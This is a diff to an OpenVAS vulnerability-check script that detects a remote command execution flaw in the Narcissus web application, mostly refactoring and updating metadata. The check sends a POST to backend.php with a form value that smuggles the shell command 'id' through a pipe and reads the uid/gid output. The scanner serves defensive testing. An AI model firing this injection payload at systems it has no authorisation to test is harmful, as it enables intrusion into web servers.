@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_narcissus_rce_11_12.nasl 3062 2016-04-14 11:03:39Z benallard $
+# $Id: gb_narcissus_rce_11_12.nasl 5714 2017-03-24 10:52:48Z cfi $
 #
 # Narcissus Remote Command Execution Vulnerability
 #
@@ -31,25 +31,18 @@ code.
 Attackers can exploit this issue to execute arbitrary code within
 the context of the affected webserver process.";
 
-
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103607";
-
 if (description)
 {
- script_oid(SCRIPT_OID);
- script_version ("$Revision: 3062 $");
+ script_oid("1.3.6.1.4.1.25623.1.0.103607");
+ script_version ("$Revision: 5714 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-
  script_name("Narcissus Remote Command Execution Vulnerability");
-
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22709/");
-
- script_tag(name:"last_modification", value:"$Date: 2016-04-14 13:03:39 +0200 (Thu, 14 Apr 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 11:52:48 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-11-14 16:22:01 +0100 (Wed, 14 Nov 2012)");
- script_summary("Determine if it is possible to execute the id command");
  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -60,38 +53,34 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-dirs = make_list("/narcissus","/narcissus-master",cgi_dirs());
-host = get_host_name();
-
+host = http_host_name( port:port );
 ex = 'machine=0&action=configure_image&release=|id';
-len = strlen(ex);
+len = strlen( ex );
 
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/narcissus", "/narcissus-master", cgi_dirs( port:port ) ) ) {
 
-  req = string("POST ",dir,"/backend.php HTTP/1.1\r\n",
+  if( dir == "/" ) dir = "";
+  url = dir + "/backend.php";
+
+  req = string("POST ",url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Connection: Close\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ",len,"\r\n",
                "\r\n",
                ex);
-
-  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
+  res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
  
-  if(result =~ "uid=[0-9]+.*gid=[0-9]+") {
-
-    security_message(port:port);
-    exit(0);
-
-  }  
-   
+  if( res =~ "uid=[0-9]+.*gid=[0-9]+" ) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
 
-exit(0);
+exit( 99 );
